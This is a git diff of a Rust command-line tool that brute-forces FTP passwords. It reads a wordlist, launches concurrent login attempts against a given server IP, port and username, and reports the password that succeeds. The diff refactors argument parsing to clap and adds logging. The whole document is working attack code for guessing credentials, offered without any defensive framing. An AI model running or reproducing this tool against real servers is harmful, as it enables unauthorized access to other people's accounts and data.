@@ -1,97 +1,80 @@
+use clap::Parser;
+use ftp::FtpStream;
+use log::{error, info};
+use simple_logger;
+use std::sync::{Arc, Mutex};
+
 use std::{
-    env,
     fs::File,
     io::{self, BufRead},
 };
 
-use ftp::FtpStream;
-use std::sync::{Arc, Mutex};
+/// Simple program to greet a person
+#[derive(Parser, Debug)]
+#[command(author, version, about, long_about = None)]
+struct Args {
+    /// ftp user
+    #[arg(short, long)]
+    u: String,
 
-use tokio::task;
+    /// wordlist path
+    #[arg(short, long)]
+    w: String,
 
-struct Config {
+    /// server ip
+    #[arg(short, long)]
     ip: String,
-    port: String,
-    file: String,
-    num_threads: String,
-    username: String,
-}
 
-impl Default for Config {
-    fn default() -> Self {
-        Self {
-            ip: String::new(),
-            port: String::new(),
-            file: String::new(),
-            num_threads: String::new(),
-            username: String::new(),
-        }
-    }
+    /// port server
+    #[arg(short, long)]
+    p: String,
+
+    #[arg(short, long, default_value_t = 1)]
+    count: u32,
 }
 
 #[tokio::main]
 async fn main() {
-    let mut config = Config::default();
-    let args: Vec<String> = env::args().collect();
+    simple_logger::init().unwrap();
 
-    for (index, arg) in args.iter().enumerate() {
-        //ip
-        if arg == "-ip" && &index + 1 < args.len() {
-            config.ip = args[index + 1].clone();
-        }
+    //thread join gandles
 
-        //port
-        if arg == "-p" && &index + 1 < args.len() {
-            config.port = args[index + 1].clone();
-        }
+    let args = Args::parse();
 
-        // wordlist
-        if arg == "-w" && &index + 1 < args.len() {
-            config.file = args[index + 1].clone();
-        }
-
-        // username
-        if arg == "-u" && &index + 1 < args.len() {
-            config.username = args[index + 1].clone();
-        }
-
-        if arg == "-t" && &index + 1 < args.len() {
-            config.num_threads = args[index + 1].clone();
-        }
-    }
-    let words = read_file(&config.file).expect("ERROR: Error opening wordlist file");
+    let words = read_file(&args.w)
+        .await
+        .expect("ERROR: Error opening wordlist file");
 
     let shared_words = Arc::new(Mutex::new(words));
 
-    let mut handles: Vec<task::JoinHandle<()>> = vec![];
+    let mut handles: Vec<tokio::task::JoinHandle<()>> = vec![];
 
     let total_requests = shared_words.lock().unwrap().len();
-
     for i in 0..total_requests {
         let shared_words = Arc::clone(&shared_words);
-        let ip = config.ip.clone();
-        let port = config.port.clone();
-        let username = config.username.clone();
-        let handle = task::spawn(async move {
-            let word = shared_words.lock().unwrap()[i].clone();
-            let connection = ftp_connect(&ip, &port, &username, &word).await;
-            if connection.is_ok() {
-                println!("[+] SUCCESS: {}", &word);
-                println!("Password found: -----{}-----", &word);
-                std::process::exit(0);
-            } else {
-                println!("[-] FAILED: {}", &word);
+        let word = shared_words.lock().unwrap()[i].clone();
+        let args = Args::parse();
+        let handle = tokio::task::spawn(async move {
+            match ftp_connect(&args.ip, &args.p, &args.u, &word).await {
+                Ok(_) => {
+                    info!("[+] SUCCESS: {}", &word);
+                    info!("PASSWORD FOUND: ---{}---", &word);
+                    std::process::exit(0);
+                }
+
+                Err(_) => {
+                    error!("[-] FAILED: {}", &word);
+                }
             }
         });
         handles.push(handle);
     }
-
     for handle in handles {
-        handle.await.expect("Error waiting for task to complete");
+        handle.await.expect("Error: waiting for task to complete");
     }
 }
 
-fn read_file(file_path: &str) -> io::Result<Vec<String>> {
+async fn read_file(file_path: &str) -> io::Result<Vec<String>> {
     let file = File::open(file_path)?;
     let reader = io::BufReader::new(file);
     Ok(reader.lines().filter_map(|line| line.ok()).collect())
